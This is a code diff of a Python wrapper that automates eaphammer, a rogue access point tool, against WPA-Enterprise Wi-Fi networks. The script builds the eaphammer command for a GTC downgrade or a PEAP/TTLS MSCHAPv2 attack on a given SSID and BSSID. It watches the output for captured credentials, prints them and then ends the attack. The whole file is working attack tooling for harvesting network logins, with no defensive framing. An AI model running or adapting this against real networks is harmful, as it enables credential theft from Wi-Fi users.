@@ -1,18 +1,15 @@
 #!/usr/bin/env python3
-"""
-Non‐interactive wrapper for eaphammer
-- Select GTC or MSCHAPv2 flow via -a/--auth-method
-- Auto‐detect credentials (case‐insensitive) and send “Enter” to cleanly stop
-- Logs eaphammer output to stdout so you can see what’s happening
-"""
+
 import argparse
-import sys
-import pexpect
 import re
+import subprocess
+import sys
 
 def parse_args():
+
+    #parse command-line arguments for interface, target, and auth flow.
     parser = argparse.ArgumentParser(
-        description="Wrapper for eaphammer that stops on credential capture"
+        description="Wrapper for eaphammer that stops on credential capture and filters output"
     )
     parser.add_argument(
         "-a", "--auth-method",
@@ -38,61 +35,99 @@ def parse_args():
     )
     return parser.parse_args()
 
+
 def run_eaphammer(args):
-    # Build the command string
-    cmd = (
-        f"eaphammer "
-        f"--interface {args.iface} "
-        f"--auth wpa-eap "
-        f"--essid {args.ssid} "
-        f"--bssid {args.bssid} "
-        f"--channel {args.channel} "
-        f"--creds "
-    )
+
+    # build the base command arguments
+    cmd = [
+        "eaphammer",
+        "--interface", args.iface,
+        "--auth", "wpa-eap",
+        "--essid", args.ssid,
+        "--bssid", args.bssid,
+        "--channel", str(args.channel),
+        "--creds",
+    ]
     if args.auth_method == "gtc":
-        cmd += "--negotiate gtc-downgrade"
+        cmd += ["--negotiate", "gtc-downgrade"]
     else:
-        cmd += (
-            "--negotiate manual "
-            "--phase-1-methods PEAP,TTLS "
-            "--phase-2-methods MSCHAPV2"
-        )
+        cmd += [
+            "--negotiate", "manual",
+            "--phase-1-methods", "PEAP,TTLS",
+            "--phase-2-methods", "MSCHAPV2",
+        ]
 
-    # Spawn eaphammer and echo its output to our stdout for visibility
-    child = pexpect.spawn(cmd, encoding="utf-8", timeout=None)
-    child.logfile = sys.stdout
+    # patterns for filtering output
+    keep_patterns = [
+        re.compile(r"^\[hostapd\] AP starting"),
+        re.compile(r'^Using interface .*ssid ".+"'),
+        re.compile(r"^wlan\d+: AP-DISABLE"),
+    ]
+    # detect credential block start
+    cred_start_patterns = [
+        re.compile(r"^GTC:", re.IGNORECASE),
+        re.compile(r"^MSCHAPV2:", re.IGNORECASE),
+    ]
+    # Iinclude any indented lines following credentials
+    cred_block_pattern = re.compile(r"^\s+")
 
-    # Compile our credential-detection regexes, case-insensitive
-    gtc_re      = re.compile(r"GTC:",      re.IGNORECASE)
-    mschap_re   = re.compile(r"MSCHAPV2:", re.IGNORECASE)
+    # spawn the process, merging stdout/stderr
+    proc = subprocess.Popen(
+        cmd,
+        stdout=subprocess.PIPE,
+        stderr=subprocess.STDOUT,
+        stdin=subprocess.PIPE,
+        text=True,
+        bufsize=1,
+    )
 
+    # scan until credentials
     try:
-        while True:
-            idx = child.expect([gtc_re, mschap_re, pexpect.EOF])
-            if idx in (0, 1):
-                # credentials found
-                print(f"[+] Detected {args.auth_method.upper()} credentials, sending Enter to terminate…")
-                child.sendline("")  # emulate the “Press enter to quit”
+        for line in proc.stdout:
+            if any(p.match(line) for p in cred_start_patterns):
+                print(line, end="")
+                print(f"[+] Detected {args.auth_method.upper()} credentials, ending the attack")
+                proc.stdin.write("\n")
+                proc.stdin.flush()
                 break
-            else:
-                # EOF—something went wrong before capture
-                print("[!] eaphammer exited before credentials were captured.", file=sys.stderr)
-                return child.exitstatus or 1
-
-        # wait for the rest of the teardown
-        child.expect(pexpect.EOF)
-        return child.exitstatus or 0
-
+            if any(p.match(line) for p in keep_patterns):
+                print(line, end="")
     except KeyboardInterrupt:
-        print("\n[!] Interrupted by user, attempting clean shutdown…", file=sys.stderr)
-        child.sendline("")  # try to trigger hostapd to quit
-        child.wait()
+        # User pressed Ctrl+C before capture
+        print("\n[!] Interrupted by user, ending the attack...", file=sys.stderr)
+        try:
+            proc.stdin.write("\n")
+            proc.stdin.flush()
+        except Exception:
+            pass
+        proc.terminate()
+        proc.wait()
         sys.exit(1)
+
+    # print credential body and teardown lines, skip blanks and progress bars
+    try:
+        for line in proc.stdout:
+            if line.strip() == "":
+                continue
+            if re.match(r"^\s*\d+%.*", line):
+                continue
+            if any(p.match(line) for p in keep_patterns) or cred_block_pattern.match(line):
+                print(line, end="")
+    except KeyboardInterrupt:
+        print("\n[!] Interrupted by user during teardown, forcing exit...", file=sys.stderr)
+        proc.terminate()
+        proc.wait()
+        sys.exit(1)
+
+    proc.wait()
+    return proc.returncode
+
 
 def main():
     args = parse_args()
     exit_code = run_eaphammer(args)
     sys.exit(exit_code)
+
 
 if __name__ == "__main__":
     main()
